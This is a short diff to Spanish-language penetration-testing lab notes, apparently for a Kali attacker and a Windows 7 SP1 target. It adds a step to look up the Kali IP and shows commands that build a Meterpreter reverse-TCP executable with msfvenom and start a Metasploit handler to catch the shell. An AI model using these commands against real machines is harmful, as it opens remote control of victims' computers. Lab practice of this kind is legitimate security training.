@@ -1,6 +1,7 @@
 ++ PC1: Kali
 ++ PC2: Windows 7 SP1
 
+++ PC1 ip addr show (Conocer la ip del kali)
 ++ PC1 msfvenom -p windows/meterpreter/reverse_tcp LHOST = <ip_PC1> LPORT=445 -f exe > <nombre_archivo.exe>
 ++ PC1 msfconsole
 ++ PC1 use exploit/multi/handler
